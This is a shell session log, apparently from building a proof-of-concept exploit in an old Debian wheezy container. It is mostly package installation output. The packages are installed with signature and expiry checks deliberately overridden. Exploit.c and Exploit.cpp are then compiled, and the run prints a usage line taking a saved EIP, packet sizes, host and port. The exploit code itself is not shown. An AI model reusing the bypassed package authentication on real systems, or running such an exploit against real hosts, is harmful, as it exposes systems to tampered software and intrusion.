+  bind9-host geoip-database krb5-locales libbind9-80 libcap2 libdns88 libgeoip1 libgssapi-krb5-2 libisc84 libisccc80 libisccfg82 libk5crypto3 libkeyutils1 libkrb5-3 libkrb5support0 liblwres80 libxml2
+Suggested packages:
+  rblcheck geoip-bin krb5-doc krb5-user
+Recommended packages:
+  xml-core
+The following NEW packages will be installed:
+  bind9-host dnsutils geoip-database krb5-locales libbind9-80 libcap2 libdns88 libgeoip1 libgssapi-krb5-2 libisc84 libisccc80 libisccfg82 libk5crypto3 libkeyutils1 libkrb5-3 libkrb5support0 liblwres80 libxml2 net-tools sudo
+0 upgraded, 20 newly installed, 0 to remove and 0 not upgraded.
+Need to get 7266 kB of archives.
+After this operation, 15.8 MB of additional disk space will be used.
+WARNING: The following packages cannot be authenticated!
+  libcap2 libkeyutils1 libkrb5support0 libk5crypto3 libkrb5-3 libgssapi-krb5-2 libxml2 geoip-database net-tools libgeoip1 libisc84 libdns88 libisccc80 libisccfg82 libbind9-80 liblwres80 bind9-host dnsutils krb5-locales sudo
+Authentication warning overridden.
+Get:1 http://archive.debian.org/debian/ wheezy/main libcap2 i386 1:2.22-1.2 [14.0 kB]
+Get:2 http://archive.debian.org/debian/ wheezy/main libkeyutils1 i386 1.5.5-3+deb7u1 [8678 B]
+Get:3 http://archive.debian.org/debian/ wheezy/main libkrb5support0 i386 1.10.1+dfsg-5+deb7u7 [50.4 kB]
+Get:4 http://archive.debian.org/debian/ wheezy/main libk5crypto3 i386 1.10.1+dfsg-5+deb7u7 [109 kB]
+Get:5 http://archive.debian.org/debian/ wheezy/main libkrb5-3 i386 1.10.1+dfsg-5+deb7u7 [403 kB]
+Get:6 http://archive.debian.org/debian/ wheezy/main libgssapi-krb5-2 i386 1.10.1+dfsg-5+deb7u7 [151 kB]
+Get:7 http://archive.debian.org/debian/ wheezy/main libxml2 i386 2.8.0+dfsg1-7+wheezy5 [895 kB]
+Get:8 http://archive.debian.org/debian/ wheezy/main geoip-database all 20130213-1 [1466 kB]
+Get:9 http://archive.debian.org/debian/ wheezy/main net-tools i386 1.60-24.2 [336 kB]
+Get:10 http://archive.debian.org/debian/ wheezy/main libgeoip1 i386 1.4.8+dfsg-3 [121 kB]
+Get:11 http://archive.debian.org/debian/ wheezy/main libisc84 i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [184 kB]
+Get:12 http://archive.debian.org/debian/ wheezy/main libdns88 i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [753 kB]
+Get:13 http://archive.debian.org/debian/ wheezy/main libisccc80 i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [36.8 kB]
+Get:14 http://archive.debian.org/debian/ wheezy/main libisccfg82 i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [60.5 kB]
+Get:15 http://archive.debian.org/debian/ wheezy/main libbind9-80 i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [42.7 kB]
+Get:16 http://archive.debian.org/debian/ wheezy/main liblwres80 i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [56.2 kB]
+Get:17 http://archive.debian.org/debian/ wheezy/main bind9-host i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [72.9 kB]
+Get:18 http://archive.debian.org/debian/ wheezy/main dnsutils i386 1:9.8.4.dfsg.P1-6+nmu2+deb7u10 [163 kB]
+Get:19 http://archive.debian.org/debian/ wheezy/main krb5-locales all 1.10.1+dfsg-5+deb7u7 [1504 kB]
+Get:20 http://archive.debian.org/debian/ wheezy/main sudo i386 1.8.5p2-1+nmu3+deb7u1 [839 kB]
+Fetched 7266 kB in 2s (3106 kB/s)
+debconf: delaying package configuration, since apt-utils is not installed
+Selecting previously unselected package libcap2:i386.
+(Reading database ... 6756 files and directories currently installed.)
+Unpacking libcap2:i386 (from .../libcap2_1%3a2.22-1.2_i386.deb) ...
+Selecting previously unselected package libkeyutils1:i386.
+Unpacking libkeyutils1:i386 (from .../libkeyutils1_1.5.5-3+deb7u1_i386.deb) ...
+Selecting previously unselected package libkrb5support0:i386.
+Unpacking libkrb5support0:i386 (from .../libkrb5support0_1.10.1+dfsg-5+deb7u7_i386.deb) ...
+Selecting previously unselected package libk5crypto3:i386.
+Unpacking libk5crypto3:i386 (from .../libk5crypto3_1.10.1+dfsg-5+deb7u7_i386.deb) ...
+Selecting previously unselected package libkrb5-3:i386.
+Unpacking libkrb5-3:i386 (from .../libkrb5-3_1.10.1+dfsg-5+deb7u7_i386.deb) ...
+Selecting previously unselected package libgssapi-krb5-2:i386.
+Unpacking libgssapi-krb5-2:i386 (from .../libgssapi-krb5-2_1.10.1+dfsg-5+deb7u7_i386.deb) ...
+Selecting previously unselected package libxml2:i386.
+Unpacking libxml2:i386 (from .../libxml2_2.8.0+dfsg1-7+wheezy5_i386.deb) ...
+Selecting previously unselected package geoip-database.
+Unpacking geoip-database (from .../geoip-database_20130213-1_all.deb) ...
+Selecting previously unselected package net-tools.
+Unpacking net-tools (from .../net-tools_1.60-24.2_i386.deb) ...
+Selecting previously unselected package libgeoip1.
+Unpacking libgeoip1 (from .../libgeoip1_1.4.8+dfsg-3_i386.deb) ...
+Selecting previously unselected package libisc84.
+Unpacking libisc84 (from .../libisc84_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package libdns88.
+Unpacking libdns88 (from .../libdns88_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package libisccc80.
+Unpacking libisccc80 (from .../libisccc80_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package libisccfg82.
+Unpacking libisccfg82 (from .../libisccfg82_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package libbind9-80.
+Unpacking libbind9-80 (from .../libbind9-80_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package liblwres80.
+Unpacking liblwres80 (from .../liblwres80_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package bind9-host.
+Unpacking bind9-host (from .../bind9-host_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package dnsutils.
+Unpacking dnsutils (from .../dnsutils_1%3a9.8.4.dfsg.P1-6+nmu2+deb7u10_i386.deb) ...
+Selecting previously unselected package krb5-locales.
+Unpacking krb5-locales (from .../krb5-locales_1.10.1+dfsg-5+deb7u7_all.deb) ...
+Selecting previously unselected package sudo.
+Unpacking sudo (from .../sudo_1.8.5p2-1+nmu3+deb7u1_i386.deb) ...
+Setting up libcap2:i386 (1:2.22-1.2) ...
+Setting up libkeyutils1:i386 (1.5.5-3+deb7u1) ...
+Setting up libkrb5support0:i386 (1.10.1+dfsg-5+deb7u7) ...
+Setting up libk5crypto3:i386 (1.10.1+dfsg-5+deb7u7) ...
+Setting up libkrb5-3:i386 (1.10.1+dfsg-5+deb7u7) ...
+Setting up libgssapi-krb5-2:i386 (1.10.1+dfsg-5+deb7u7) ...
+Setting up libxml2:i386 (2.8.0+dfsg1-7+wheezy5) ...
+Setting up geoip-database (20130213-1) ...
+Setting up net-tools (1.60-24.2) ...
+Setting up libgeoip1 (1.4.8+dfsg-3) ...
+Setting up libisc84 (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up libdns88 (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up libisccc80 (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up libisccfg82 (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up libbind9-80 (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up liblwres80 (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up bind9-host (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up dnsutils (1:9.8.4.dfsg.P1-6+nmu2+deb7u10) ...
+Setting up krb5-locales (1.10.1+dfsg-5+deb7u7) ...
+Setting up sudo (1.8.5p2-1+nmu3+deb7u1) ...
+root@29bcb37807cf:/poc# apt-get -o Acquire::Check-Valid-Until=false --allow-unauthenticated install -y build-essential
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+Some packages could not be installed. This may mean that you have
+requested an impossible situation or if you are using the unstable
+distribution that some required packages have not yet been created
+or been moved out of Incoming.
+The following information may help to resolve the situation:
+
+The following packages have unmet dependencies:
+ build-essential : Depends: libc6-dev but it is not going to be installed or
+                            libc-dev
+                   Depends: g++ (>= 4:4.4.3) but it is not going to be installed
+                   Depends: dpkg-dev (>= 1.13.5) but it is not going to be installed
+E: Unable to correct problems, you have held broken packages.
+root@29bcb37807cf:/poc# cat > /etc/apt/sources.list <<'EOF'
+> deb http://archive.debian.org/debian/ wheezy main contrib non-free
+> deb http://archive.debian.org/debian-security/ wheezy/updates main contrib non-free
+> EOF
+root@29bcb37807cf:/poc# echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check-valid-until
+root@29bcb37807cf:/poc# apt-get update -o Acquire::Check-Valid-Until=false
+Get:1 http://archive.debian.org wheezy Release.gpg [2373 B]
+Get:2 http://archive.debian.org wheezy/updates Release.gpg [1601 B]
+Hit http://archive.debian.org wheezy Release
+Get:3 http://archive.debian.org wheezy/updates Release [52.3 kB]
+Ign http://archive.debian.org wheezy Release
+Hit http://archive.debian.org wheezy/main i386 Packages
+Ign http://archive.debian.org wheezy/updates Release
+Get:4 http://archive.debian.org wheezy/contrib i386 Packages [50.9 kB]
+Get:5 http://archive.debian.org wheezy/non-free i386 Packages [96.4 kB]
+Get:6 http://archive.debian.org wheezy/updates/main i386 Packages [749 kB]
+Get:7 http://archive.debian.org wheezy/updates/contrib i386 Packages [20 B]
+Get:8 http://archive.debian.org wheezy/updates/non-free i386 Packages [732 B]
+Fetched 954 kB in 1s (724 kB/s)
+Reading package lists... Done
+W: GPG error: http://archive.debian.org wheezy Release: The following signatures were invalid: KEYEXPIRED 1587841717 KEYEXPIRED 1668891673 KEYEXPIRED 1557241909
+W: GPG error: http://archive.debian.org wheezy/updates Release: The following signatures were invalid: KEYEXPIRED 1668892417 KEYEXPIRED 1587841717
+root@29bcb37807cf:/poc# apt-get install -y --allow-unauthenticated libc6-dev g++ dpkg-dev make gcc
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following extra packages will be installed:
+  binutils build-essential bzip2 cpp cpp-4.7 fakeroot g++-4.7 gcc-4.7 ifupdown libalgorithm-diff-perl libalgorithm-diff-xs-perl libalgorithm-merge-perl libc-dev-bin libclass-isa-perl libdpkg-perl libfile-fcntllock-perl libgdbm3 libgmp10 libgomp1
+  libitm1 libmpc2 libmpfr4 libquadmath0 libstdc++6-4.7-dev libswitch-perl libtimedate-perl linux-libc-dev manpages manpages-dev netbase patch perl perl-modules
+Suggested packages:
+  binutils-doc bzip2-doc cpp-doc gcc-4.7-locales debian-keyring g++-multilib g++-4.7-multilib gcc-4.7-doc libstdc++6-4.7-dbg gcc-multilib autoconf automake1.9 libtool flex bison gdb gcc-doc gcc-4.7-multilib libmudflap0-4.7-dev libgcc1-dbg
+  libgomp1-dbg libitm1-dbg libquadmath0-dbg libmudflap0-dbg libcloog-ppl0 libppl-c2 libppl7 binutils-gold isc-dhcp-client dhcp-client ppp rdnssd glibc-doc libstdc++6-4.7-doc make-doc man-browser ed diffutils-doc perl-doc libterm-readline-gnu-perl
+  libterm-readline-perl-perl libpod-plainer-perl
+The following NEW packages will be installed:
+  binutils build-essential bzip2 cpp cpp-4.7 dpkg-dev fakeroot g++ g++-4.7 gcc gcc-4.7 ifupdown libalgorithm-diff-perl libalgorithm-diff-xs-perl libalgorithm-merge-perl libc-dev-bin libc6-dev libclass-isa-perl libdpkg-perl libfile-fcntllock-perl
+  libgdbm3 libgmp10 libgomp1 libitm1 libmpc2 libmpfr4 libquadmath0 libstdc++6-4.7-dev libswitch-perl libtimedate-perl linux-libc-dev make manpages manpages-dev netbase patch perl perl-modules
+0 upgraded, 38 newly installed, 0 to remove and 15 not upgraded.
+Need to get 47.7 MB of archives.
+After this operation, 129 MB of additional disk space will be used.
+WARNING: The following packages cannot be authenticated!
+  ifupdown libgdbm3 libgmp10 libgomp1 libitm1 libmpfr4 libquadmath0 libmpc2 manpages netbase bzip2 libclass-isa-perl perl-modules perl libswitch-perl patch binutils libc-dev-bin linux-libc-dev libc6-dev cpp-4.7 cpp gcc-4.7 gcc libstdc++6-4.7-dev
+  g++-4.7 g++ make libtimedate-perl libdpkg-perl dpkg-dev build-essential fakeroot libalgorithm-diff-perl libalgorithm-diff-xs-perl libalgorithm-merge-perl libfile-fcntllock-perl manpages-dev
+Authentication warning overridden.
+Get:1 http://archive.debian.org/debian/ wheezy/main ifupdown i386 0.7.8 [64.3 kB]
+Get:2 http://archive.debian.org/debian/ wheezy/main libgdbm3 i386 1.8.3-11 [46.6 kB]
+Get:3 http://archive.debian.org/debian/ wheezy/main libgmp10 i386 2:5.0.5+dfsg-2 [263 kB]
+Get:4 http://archive.debian.org/debian/ wheezy/main libgomp1 i386 4.7.2-5 [29.1 kB]
+Get:5 http://archive.debian.org/debian/ wheezy/main libitm1 i386 4.7.2-5 [36.2 kB]
+Get:6 http://archive.debian.org/debian/ wheezy/main libmpfr4 i386 3.1.0-5 [535 kB]
+Get:7 http://archive.debian.org/debian/ wheezy/main libquadmath0 i386 4.7.2-5 [198 kB]
+Get:8 http://archive.debian.org/debian/ wheezy/main libmpc2 i386 0.9-4 [41.3 kB]
+Get:9 http://archive.debian.org/debian/ wheezy/main manpages all 3.44-1 [795 kB]
+Get:10 http://archive.debian.org/debian/ wheezy/main netbase all 5.0 [20.1 kB]
+Get:11 http://archive.debian.org/debian/ wheezy/main bzip2 i386 1.0.6-4 [49.5 kB]
+Get:12 http://archive.debian.org/debian/ wheezy/main libclass-isa-perl all 0.36-3 [12.3 kB]
+Get:13 http://archive.debian.org/debian-security/ wheezy/updates/main perl-modules all 5.14.2-21+deb7u6 [3441 kB]
+Get:14 http://archive.debian.org/debian-security/ wheezy/updates/main perl i386 5.14.2-21+deb7u6 [3691 kB]
+Get:15 http://archive.debian.org/debian/ wheezy/main libswitch-perl all 2.16-2 [21.0 kB]
+Get:16 http://archive.debian.org/debian-security/ wheezy/updates/main patch i386 2.6.1-3+deb7u1 [126 kB]
+Get:17 http://archive.debian.org/debian-security/ wheezy/updates/main binutils i386 2.22-8+deb7u3 [4565 kB]
+Get:18 http://archive.debian.org/debian-security/ wheezy/updates/main libc-dev-bin i386 2.13-38+deb7u12 [221 kB]
+Get:19 http://archive.debian.org/debian-security/ wheezy/updates/main linux-libc-dev i386 3.2.102-1 [890 kB]
+Get:20 http://archive.debian.org/debian-security/ wheezy/updates/main libc6-dev i386 2.13-38+deb7u12 [4955 kB]
+Get:21 http://archive.debian.org/debian/ wheezy/main cpp-4.7 i386 4.7.2-5 [5213 kB]
+Get:22 http://archive.debian.org/debian/ wheezy/main cpp i386 4:4.7.2-1 [16.6 kB]
+Get:23 http://archive.debian.org/debian/ wheezy/main gcc-4.7 i386 4.7.2-5 [8267 kB]
+Get:24 http://archive.debian.org/debian/ wheezy/main gcc i386 4:4.7.2-1 [5062 B]
+Get:25 http://archive.debian.org/debian/ wheezy/main libstdc++6-4.7-dev i386 4.7.2-5 [1711 kB]
+Get:26 http://archive.debian.org/debian/ wheezy/main g++-4.7 i386 4.7.2-5 [7786 kB]
+Get:27 http://archive.debian.org/debian/ wheezy/main g++ i386 4:4.7.2-1 [1372 B]
+Get:28 http://archive.debian.org/debian/ wheezy/main make i386 3.81-8.2 [398 kB]
+Get:29 http://archive.debian.org/debian/ wheezy/main libtimedate-perl all 1.2000-1 [41.2 kB]
+Get:30 http://archive.debian.org/debian/ wheezy/main libdpkg-perl all 1.16.18 [966 kB]
+Get:31 http://archive.debian.org/debian/ wheezy/main dpkg-dev all 1.16.18 [1366 kB]
+Get:32 http://archive.debian.org/debian/ wheezy/main build-essential i386 11.5 [7190 B]
+Get:33 http://archive.debian.org/debian/ wheezy/main fakeroot i386 1.18.4-2 [107 kB]
+Get:34 http://archive.debian.org/debian/ wheezy/main libalgorithm-diff-perl all 1.19.02-2 [51.5 kB]
+Get:35 http://archive.debian.org/debian/ wheezy/main libalgorithm-diff-xs-perl i386 0.04-2+b1 [13.3 kB]
+Get:36 http://archive.debian.org/debian/ wheezy/main libalgorithm-merge-perl all 0.08-2 [13.5 kB]
+Get:37 http://archive.debian.org/debian/ wheezy/main libfile-fcntllock-perl i386 0.14-2 [17.2 kB]
+Get:38 http://archive.debian.org/debian/ wheezy/main manpages-dev all 3.44-1 [1737 kB]
+Fetched 47.7 MB in 3s (15.5 MB/s)
+debconf: delaying package configuration, since apt-utils is not installed
+Selecting previously unselected package ifupdown.
+(Reading database ... 7010 files and directories currently installed.)
+Unpacking ifupdown (from .../ifupdown_0.7.8_i386.deb) ...
+Selecting previously unselected package libgdbm3:i386.
+Unpacking libgdbm3:i386 (from .../libgdbm3_1.8.3-11_i386.deb) ...
+Selecting previously unselected package libgmp10:i386.
+Unpacking libgmp10:i386 (from .../libgmp10_2%3a5.0.5+dfsg-2_i386.deb) ...
+Selecting previously unselected package libgomp1:i386.
+Unpacking libgomp1:i386 (from .../libgomp1_4.7.2-5_i386.deb) ...
+Selecting previously unselected package libitm1:i386.
+Unpacking libitm1:i386 (from .../libitm1_4.7.2-5_i386.deb) ...
+Selecting previously unselected package libmpfr4:i386.
+Unpacking libmpfr4:i386 (from .../libmpfr4_3.1.0-5_i386.deb) ...
+Selecting previously unselected package libquadmath0:i386.
+Unpacking libquadmath0:i386 (from .../libquadmath0_4.7.2-5_i386.deb) ...
+Selecting previously unselected package libmpc2:i386.
+Unpacking libmpc2:i386 (from .../libmpc2_0.9-4_i386.deb) ...
+Selecting previously unselected package manpages.
+Unpacking manpages (from .../manpages_3.44-1_all.deb) ...
+Selecting previously unselected package netbase.
+Unpacking netbase (from .../archives/netbase_5.0_all.deb) ...
+Selecting previously unselected package bzip2.
+Unpacking bzip2 (from .../bzip2_1.0.6-4_i386.deb) ...
+Selecting previously unselected package libclass-isa-perl.
+Unpacking libclass-isa-perl (from .../libclass-isa-perl_0.36-3_all.deb) ...
+Selecting previously unselected package perl-modules.
+Unpacking perl-modules (from .../perl-modules_5.14.2-21+deb7u6_all.deb) ...
+Selecting previously unselected package perl.
+Unpacking perl (from .../perl_5.14.2-21+deb7u6_i386.deb) ...
+Selecting previously unselected package libswitch-perl.
+Unpacking libswitch-perl (from .../libswitch-perl_2.16-2_all.deb) ...
+Selecting previously unselected package patch.
+Unpacking patch (from .../patch_2.6.1-3+deb7u1_i386.deb) ...
+Selecting previously unselected package binutils.
+Unpacking binutils (from .../binutils_2.22-8+deb7u3_i386.deb) ...
+Selecting previously unselected package libc-dev-bin.
+Unpacking libc-dev-bin (from .../libc-dev-bin_2.13-38+deb7u12_i386.deb) ...
+Selecting previously unselected package linux-libc-dev:i386.
+Unpacking linux-libc-dev:i386 (from .../linux-libc-dev_3.2.102-1_i386.deb) ...
+Selecting previously unselected package libc6-dev:i386.
+Unpacking libc6-dev:i386 (from .../libc6-dev_2.13-38+deb7u12_i386.deb) ...
+Selecting previously unselected package cpp-4.7.
+Unpacking cpp-4.7 (from .../cpp-4.7_4.7.2-5_i386.deb) ...
+Selecting previously unselected package cpp.
+Unpacking cpp (from .../cpp_4%3a4.7.2-1_i386.deb) ...
+Selecting previously unselected package gcc-4.7.
+Unpacking gcc-4.7 (from .../gcc-4.7_4.7.2-5_i386.deb) ...
+Selecting previously unselected package gcc.
+Unpacking gcc (from .../gcc_4%3a4.7.2-1_i386.deb) ...
+Selecting previously unselected package libstdc++6-4.7-dev.
+Unpacking libstdc++6-4.7-dev (from .../libstdc++6-4.7-dev_4.7.2-5_i386.deb) ...
+Selecting previously unselected package g++-4.7.
+Unpacking g++-4.7 (from .../g++-4.7_4.7.2-5_i386.deb) ...
+Selecting previously unselected package g++.
+Unpacking g++ (from .../g++_4%3a4.7.2-1_i386.deb) ...
+Selecting previously unselected package make.
+Unpacking make (from .../make_3.81-8.2_i386.deb) ...
+Selecting previously unselected package libtimedate-perl.
+Unpacking libtimedate-perl (from .../libtimedate-perl_1.2000-1_all.deb) ...
+Selecting previously unselected package libdpkg-perl.
+Unpacking libdpkg-perl (from .../libdpkg-perl_1.16.18_all.deb) ...
+Selecting previously unselected package dpkg-dev.
+Unpacking dpkg-dev (from .../dpkg-dev_1.16.18_all.deb) ...
+Selecting previously unselected package build-essential.
+Unpacking build-essential (from .../build-essential_11.5_i386.deb) ...
+Selecting previously unselected package fakeroot.
+Unpacking fakeroot (from .../fakeroot_1.18.4-2_i386.deb) ...
+Selecting previously unselected package libalgorithm-diff-perl.
+Unpacking libalgorithm-diff-perl (from .../libalgorithm-diff-perl_1.19.02-2_all.deb) ...
+Selecting previously unselected package libalgorithm-diff-xs-perl.
+Unpacking libalgorithm-diff-xs-perl (from .../libalgorithm-diff-xs-perl_0.04-2+b1_i386.deb) ...
+Selecting previously unselected package libalgorithm-merge-perl.
+Unpacking libalgorithm-merge-perl (from .../libalgorithm-merge-perl_0.08-2_all.deb) ...
+Selecting previously unselected package libfile-fcntllock-perl.
+Unpacking libfile-fcntllock-perl (from .../libfile-fcntllock-perl_0.14-2_i386.deb) ...
+Selecting previously unselected package manpages-dev.
+Unpacking manpages-dev (from .../manpages-dev_3.44-1_all.deb) ...
+Setting up ifupdown (0.7.8) ...
+Creating /etc/network/interfaces.
+Setting up libgdbm3:i386 (1.8.3-11) ...
+Setting up libgmp10:i386 (2:5.0.5+dfsg-2) ...
+Setting up libgomp1:i386 (4.7.2-5) ...
+Setting up libitm1:i386 (4.7.2-5) ...
+Setting up libmpfr4:i386 (3.1.0-5) ...
+Setting up libquadmath0:i386 (4.7.2-5) ...
+Setting up libmpc2:i386 (0.9-4) ...
+Setting up manpages (3.44-1) ...
+Setting up netbase (5.0) ...
+Setting up bzip2 (1.0.6-4) ...
+Setting up libclass-isa-perl (0.36-3) ...
+Setting up patch (2.6.1-3+deb7u1) ...
+Setting up binutils (2.22-8+deb7u3) ...
+Setting up libc-dev-bin (2.13-38+deb7u12) ...
+Setting up linux-libc-dev:i386 (3.2.102-1) ...
+Setting up libc6-dev:i386 (2.13-38+deb7u12) ...
+Setting up cpp-4.7 (4.7.2-5) ...
+Setting up cpp (4:4.7.2-1) ...
+Setting up gcc-4.7 (4.7.2-5) ...
+Setting up gcc (4:4.7.2-1) ...
+Setting up make (3.81-8.2) ...
+Setting up fakeroot (1.18.4-2) ...
+update-alternatives: using /usr/bin/fakeroot-sysv to provide /usr/bin/fakeroot (fakeroot) in auto mode
+Setting up manpages-dev (3.44-1) ...
+Setting up libswitch-perl (2.16-2) ...
+Setting up perl-modules (5.14.2-21+deb7u6) ...
+Setting up perl (5.14.2-21+deb7u6) ...
+update-alternatives: using /usr/bin/prename to provide /usr/bin/rename (rename) in auto mode
+Setting up libstdc++6-4.7-dev (4.7.2-5) ...
+Setting up g++-4.7 (4.7.2-5) ...
+Setting up g++ (4:4.7.2-1) ...
+update-alternatives: using /usr/bin/g++ to provide /usr/bin/c++ (c++) in auto mode
+Setting up libtimedate-perl (1.2000-1) ...
+Setting up libdpkg-perl (1.16.18) ...
+Setting up dpkg-dev (1.16.18) ...
+Setting up build-essential (11.5) ...
+Setting up libalgorithm-diff-perl (1.19.02-2) ...
+Setting up libalgorithm-diff-xs-perl (0.04-2+b1) ...
+Setting up libalgorithm-merge-perl (0.08-2) ...
+Setting up libfile-fcntllock-perl (0.14-2) ...
+root@29bcb37807cf:/poc# apt-get install -y --allow-unauthenticated build-essential
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+build-essential is already the newest version.
+build-essential set to manually installed.
+0 upgraded, 0 newly installed, 0 to remove and 15 not upgraded.
+root@29bcb37807cf:/poc# apt-get install -y --allow-unauthenticated libc6-dev libgcc1 libstdc++6
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+libgcc1 is already the newest version.
+libgcc1 set to manually installed.
+libstdc++6 is already the newest version.
+libstdc++6 set to manually installed.
+libc6-dev is already the newest version.
+0 upgraded, 0 newly installed, 0 to remove and 15 not upgraded.
+root@29bcb37807cf:/poc# apt-get install -y --allow-unauthenticated gcc g++ make dpkg-dev
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+dpkg-dev is already the newest version.
+g++ is already the newest version.
+gcc is already the newest version.
+make is already the newest version.
+0 upgraded, 0 newly installed, 0 to remove and 15 not upgraded.
+root@29bcb37807cf:/poc# apt-get install -y --allow-unauthenticated build-essential
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+build-essential is already the newest version.
+0 upgraded, 0 newly installed, 0 to remove and 15 not upgraded.
+root@29bcb37807cf:/poc# apt-get update -o Acquire::Check-Valid-Until=false && \
+> apt-get install -y --allow-unauthenticated libc6-dev libgcc1 libstdc++6 gcc g++ make dpkg-dev build-essential
+Get:1 http://archive.debian.org wheezy Release.gpg [2373 B]
+Get:2 http://archive.debian.org wheezy/updates Release.gpg [1601 B]
+Hit http://archive.debian.org wheezy Release
+Hit http://archive.debian.org wheezy/updates Release
+Ign http://archive.debian.org wheezy Release
+Hit http://archive.debian.org wheezy/main i386 Packages
+Ign http://archive.debian.org wheezy/updates Release
+Hit http://archive.debian.org wheezy/contrib i386 Packages
+Hit http://archive.debian.org wheezy/non-free i386 Packages
+Hit http://archive.debian.org wheezy/updates/main i386 Packages
+Hit http://archive.debian.org wheezy/updates/contrib i386 Packages
+Hit http://archive.debian.org wheezy/updates/non-free i386 Packages
+Fetched 3974 B in 1s (3086 B/s)
+Reading package lists... Done
+W: GPG error: http://archive.debian.org wheezy Release: The following signatures were invalid: KEYEXPIRED 1587841717 KEYEXPIRED 1668891673 KEYEXPIRED 1557241909
+W: GPG error: http://archive.debian.org wheezy/updates Release: The following signatures were invalid: KEYEXPIRED 1668892417 KEYEXPIRED 1587841717
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+build-essential is already the newest version.
+dpkg-dev is already the newest version.
+libgcc1 is already the newest version.
+libstdc++6 is already the newest version.
+g++ is already the newest version.
+gcc is already the newest version.
+make is already the newest version.
+libc6-dev is already the newest version.
+0 upgraded, 0 newly installed, 0 to remove and 15 not upgraded.
+root@29bcb37807cf:/poc# which gcc
+/usr/bin/gcc
+root@29bcb37807cf:/poc# which g++
+/usr/bin/g++
+root@29bcb37807cf:/poc# which make
+/usr/bin/make
+root@29bcb37807cf:/poc# apt-get update -o Acquire::Check-Valid-Until=false
+Get:1 http://archive.debian.org wheezy Release.gpg [2373 B]
+Get:2 http://archive.debian.org wheezy/updates Release.gpg [1601 B]
+Hit http://archive.debian.org wheezy Release
+Hit http://archive.debian.org wheezy/updates Release
+Ign http://archive.debian.org wheezy Release
+Ign http://archive.debian.org wheezy/updates Release
+Hit http://archive.debian.org wheezy/main i386 Packages
+Hit http://archive.debian.org wheezy/contrib i386 Packages
+Hit http://archive.debian.org wheezy/non-free i386 Packages
+Hit http://archive.debian.org wheezy/updates/main i386 Packages
+Hit http://archive.debian.org wheezy/updates/contrib i386 Packages
+Hit http://archive.debian.org wheezy/updates/non-free i386 Packages
+Fetched 3974 B in 1s (2983 B/s)
+Reading package lists... Done
+W: GPG error: http://archive.debian.org wheezy Release: The following signatures were invalid: KEYEXPIRED 1587841717 KEYEXPIRED 1668891673 KEYEXPIRED 1557241909
+W: GPG error: http://archive.debian.org wheezy/updates Release: The following signatures were invalid: KEYEXPIRED 1668892417 KEYEXPIRED 1587841717
+root@29bcb37807cf:/poc# apt-get install -y --allow-unauthenticated gcc g++ make libc6-dev dpkg-dev
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+dpkg-dev is already the newest version.
+g++ is already the newest version.
+gcc is already the newest version.
+make is already the newest version.
+libc6-dev is already the newest version.
+0 upgraded, 0 newly installed, 0 to remove and 15 not upgraded.
+root@29bcb37807cf:/poc# apt-get install -y --allow-unauthenticated build-essential
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+build-essential is already the newest version.
+0 upgraded, 0 newly installed, 0 to remove and 15 not upgraded.
+root@29bcb37807cf:/poc# gcc --version
+gcc (Debian 4.7.2-5) 4.7.2
+Copyright (C) 2012 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+root@29bcb37807cf:/poc# g++ --version
+g++ (Debian 4.7.2-5) 4.7.2
+Copyright (C) 2012 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+root@29bcb37807cf:/poc# make --version
+GNU Make 3.81
+Copyright (C) 2006  Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+
+This program built for i486-pc-linux-gnu
+root@29bcb37807cf:/poc# ./poc
+bash: ./poc: No such file or directory
+root@29bcb37807cf:/poc# ls
+Exploit.c  Exploit.cpp  Exploit.out  LICENSE  README.md
+root@29bcb37807cf:/poc# make
+make: *** No targets specified and no makefile found.  Stop.
+root@29bcb37807cf:/poc# make Exploit.c
+make: Nothing to be done for `Exploit.c'.
+root@29bcb37807cf:/poc# gcc Exploit.c -o exploit
+root@29bcb37807cf:/poc# g++ Exploit.cpp -o exploit
+root@29bcb37807cf:/poc# ./exploit
+
+Usage: ./exploit <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>
+
